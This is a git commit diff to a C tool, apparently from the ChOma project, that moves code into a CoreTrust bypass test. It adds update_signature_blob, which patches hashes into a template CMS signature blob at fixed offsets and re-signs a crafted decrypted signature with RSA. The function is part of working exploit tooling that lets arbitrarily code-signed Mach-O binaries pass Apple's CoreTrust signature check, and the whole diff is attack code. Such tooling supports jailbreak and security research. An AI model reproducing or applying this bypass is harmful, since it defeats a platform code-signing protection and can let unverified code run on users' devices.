b27c4edc492d3ee23d5d946615519534ce91f853
opa334 <opa334@users.noreply.github.com>
2023-11-25 22:57:10 +0100

    Move decrypted signature stuff to coretrust bypass

--- tests/ct_bypass/main.c
+++ tests/ct_bypass/main.c
@@ -12,11 +12,12 @@
 #include <choma/FileStream.h>
 #include <choma/BufferedStream.h>
 #include <choma/Signing.h>
-#include <choma/SignatureBlob.h>
 #include <choma/SignOSSL.h>
 #include <choma/CodeDirectory.h>
+#include <choma/Base64.h>
 #include "AppStoreCodeDirectory.h"
 #include "TemplateSignatureBlob.h"
+#include "DecryptedSignature.h"
 #include <copyfile.h>
 
 char *extract_preferred_slice(const char *fatPath)
@@ -93,6 +94,105 @@ void print_usage(const char *self)
     printf("\t%s -i <path to input MachO/FAT file> (-r) (-o <path to output MachO file>)\n", self);
     printf("\t%s -i <path to input .app bundle> -a\n", self);
     exit(-1);
+}
+
+// We can use static offsets here because we use a template signature blob
+#define SIGNED_ATTRS_OFFSET 0x12DE // SignedAttributes sequence
+#define HASHHASH_OFFSET 0x1388 // SHA256 hash SignedAttribute
+#define BASEBASE_OFFSET 0x14C5 // Base64 hash SignedAttribute
+#define SIGNSIGN_OFFSET 0x151A // Signature
+
+#define DECRYPTED_SIGNATURE_HASH_OFFSET 0x13
+
+int update_signature_blob(CS_DecodedSuperBlob *superblob)
+{
+    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
+    if (!sha256CD) {
+        printf("Could not find CodeDirectory blob!\n");
+        return -1;
+    }
+    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
+    if (!signatureBlob) {
+        printf("Could not find signature blob!\n");
+        return -1;
+    }
+
+    uint8_t fullHash[CC_SHA256_DIGEST_LENGTH];
+    size_t dataSizeToRead = csd_blob_get_size(sha256CD);
+    uint8_t *data = malloc(dataSizeToRead);
+    memset(data, 0, dataSizeToRead);
+    csd_blob_read(sha256CD, 0, dataSizeToRead, data);
+    CC_SHA256(data, (CC_LONG)dataSizeToRead, fullHash);
+    free(data);
+    uint8_t secondCDSHA256Hash[CC_SHA256_DIGEST_LENGTH];
+    memcpy(secondCDSHA256Hash, fullHash, CC_SHA256_DIGEST_LENGTH);
+    // Print the hash
+    printf("SHA256 hash: ");
+    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
+        printf("%02x", secondCDSHA256Hash[i]);
+    }
+    printf("\n");
+
+    size_t base64OutLength = 0;
+    char *newBase64Hash = base64_encode(secondCDSHA256Hash, CC_SHA1_DIGEST_LENGTH, &base64OutLength);
+    if (!newBase64Hash) {
+        printf("Failed to base64 encode hash!\n");
+        return -1;
+    }
+
+    // Print the base64 hash
+    printf("Base64 hash: %.*s\n", CC_SHA256_DIGEST_LENGTH, newBase64Hash);
+
+    int ret = csd_blob_write(signatureBlob, HASHHASH_OFFSET, CC_SHA256_DIGEST_LENGTH, secondCDSHA256Hash);
+    if (ret != 0) {
+        printf("Failed to write SHA256 hash to signature blob!\n");
+        free(newBase64Hash);
+        return -1;
+    }
+    
+    ret = csd_blob_write(signatureBlob, BASEBASE_OFFSET, base64OutLength, newBase64Hash);
+    if (ret != 0) {
+        printf("Failed to write base64 hash to signature blob!\n");
+        free(newBase64Hash);
+        return -1;
+    }
+
+    free(newBase64Hash);
+
+    unsigned char *newSignature = NULL;
+    size_t newSignatureSize = 0;
+
+    unsigned char newDecryptedSignature[0x33];
+    memset(newDecryptedSignature, 0, 0x33);
+    memcpy(newDecryptedSignature, DecryptedSignature, 0x33);
+
+    // Get the signed attributes hash
+    unsigned char signedAttrs[0x229];
+    memset(signedAttrs, 0, 0x229);
+    csd_blob_read(signatureBlob, SIGNED_ATTRS_OFFSET, 0x229, signedAttrs);
+    signedAttrs[0] = 0x31;
+    
+    // Hash
+    uint8_t fullAttributesHash[CC_SHA256_DIGEST_LENGTH];
+    CC_SHA256(signedAttrs, (CC_LONG)0x229, fullAttributesHash);
+    memcpy(newDecryptedSignature + DECRYPTED_SIGNATURE_HASH_OFFSET, fullAttributesHash, CC_SHA256_DIGEST_LENGTH);
+
+    newSignature = signWithRSA(newDecryptedSignature, DecryptedSignature_len, &newSignatureSize);
+
+    if (!newSignature) {
+        printf("Failed to sign the decrypted signature!\n");
+        return -1;
+    }
+
+    if (newSignatureSize != 0x100) {
+        printf("The new signature is not the correct size!\n");
+        free(newSignature);
+        return -1;
+    }
+
+    ret = csd_blob_write(signatureBlob, SIGNSIGN_OFFSET, newSignatureSize, newSignature);
+    free(newSignature);
+    return ret;
 }
 
 int apply_coretrust_bypass(const char *machoPath)
